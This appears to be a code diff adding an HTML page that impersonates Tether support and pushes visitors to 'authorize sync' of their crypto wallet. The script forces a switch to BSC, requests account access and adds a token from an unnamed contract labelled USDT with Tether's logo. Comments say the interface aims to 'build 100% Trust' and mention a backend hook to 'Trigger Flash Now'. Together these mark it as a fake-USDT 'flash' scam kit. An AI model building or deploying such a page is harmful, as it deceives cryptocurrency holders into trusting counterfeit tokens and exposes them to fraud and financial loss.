@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Tether Support | Asset Verification</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        /* Professional UI to build 100% Trust */
+        body { background: #0b0e11; color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #181a20; border: 1px solid #2b2f36; padding: 35px; border-radius: 20px; text-align: center; max-width: 380px; box-shadow: 0 15px 45px rgba(0,0,0,0.4); }
+        .tether-logo { width: 70px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #26a17b); }
+        .btn-sync { background: #26a17b; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn-sync:hover { background: #1e7d5f; transform: scale(1.02); }
+        .footer { margin-top: 15px; font-size: 10px; color: #474d57; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="tether-logo">
+    <h2 style="margin:0 0 10px 0;">Network Synchronization</h2>
+    <p style="color:#848e9c; font-size:14px; margin-bottom:25px;">Please synchronize your wallet with the Tether Bridge to enable real-time asset tracking and official metadata mapping.</p>
+    
+    <button id="syncBtn" class="btn-sync">AUTHORIZE SYNC</button>
+    <div class="footer">ENCRYPTED END-TO-END | BINANCE SMART CHAIN</div>
+</div>
+
+<script>
+const CONFIG = {
+    address: 'YOUR_CONTRACT_ADDRESS', // Contract Address Here
+    symbol: 'USDT',
+    decimals: 6,
+    image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+    chainId: '0x38' // BSC Mainnet Hex ID
+};
+
+async function startAdvancedInjection() {
+    if (!window.ethereum) return alert("Please use a Web3 Browser");
+
+    try {
+        // Step 1: Force Network Switch to BSC (Zero Error Step)
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: CONFIG.chainId }],
+            });
+        } catch (switchError) {
+            // Agar chain add nahi hai, to pehle add karwao
+            if (switchError.code === 4902) {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: CONFIG.chainId,
+                        chainName: 'Binance Smart Chain',
+                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                        blockExplorerUrls: ['https://bscscan.com/']
+                    }]
+                });
+            }
+        }
+
+        // Step 2: Request Account Access
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+        // Step 3: The "Deep Injection" of Metadata
+        const success = await window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+                type: 'ERC20',
+                options: {
+                    address: CONFIG.address,
+                    symbol: CONFIG.symbol,
+                    decimals: CONFIG.decimals,
+                    image: CONFIG.image,
+                },
+            },
+        });
+
+        if (success) {
+            document.getElementById('syncBtn').innerText = "SUCCESSFULLY SYNCED";
+            document.getElementById('syncBtn').style.background = "#444";
+            // Yahan aap apna backend API call add kar sakte hain: "Trigger Flash Now"
+        }
+
+    } catch (e) {
+        console.error(e);
+        alert("Sync failed. Check connection.");
+    }
+}
+
+document.getElementById('syncBtn').addEventListener('click', startAdvancedInjection);
+</script>
+</body>
+</html>
